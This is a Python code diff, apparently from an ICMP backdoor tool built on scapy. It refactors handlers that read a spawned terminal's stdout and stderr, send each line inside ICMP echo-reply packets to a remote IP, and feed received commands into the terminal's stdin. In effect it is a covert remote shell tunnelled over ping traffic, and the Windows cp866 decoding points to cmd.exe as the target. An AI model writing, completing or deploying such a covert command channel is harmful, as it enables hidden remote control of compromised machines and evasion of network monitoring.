@@ -1,6 +1,4 @@
 import argparse
-import platform
-import subprocess
 import sys
 import threading
 
@@ -9,7 +7,7 @@ from scapy.layers.l2 import Ether
 from scapy.sendrecv import sniff, send
 
 import config
-import opening_terminal
+from opening_terminal import p
 
 output = None
 error = None
@@ -19,9 +17,9 @@ destination_mac = "ff:ff:ff:ff:ff:ff"
 source_mac = "ff:ff:ff:ff:ff:ff"
 
 
-def send_packet():
+def readstdout():
     global destination_ip, destination_mac, source_mac, source_mac
-    for l in iter(opening_terminal.p.stdout.readline, b""):
+    for l in iter(p.stdout.readline, b""):
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
@@ -31,17 +29,20 @@ def send_packet():
         sys.stdout.write(string + "\n")
 
 
-def readstdout():
-    send_packet()
-
-
 def readstderr():
-    send_packet()
+    for l in iter(p.stderr.readline, b""):
+        string = f'{l.decode("cp866", "backslashreplace")}'.strip()
+        if string == '':
+            continue
+        reply_packet = IP(dst=destination_ip) / ICMP(type=0,
+                                                     id=config.ID) / string
+        send(reply_packet, verbose=False)
+        sys.stderr.write(string + "\n")
 
 
 def sendcommand(cmd):
-    opening_terminal.p.stdin.write(cmd.encode() + b"\n")
-    opening_terminal.p.stdin.flush()
+    p.stdin.write(cmd.encode() + b"\n")
+    p.stdin.flush()
 
 
 def packet_callback(packet):
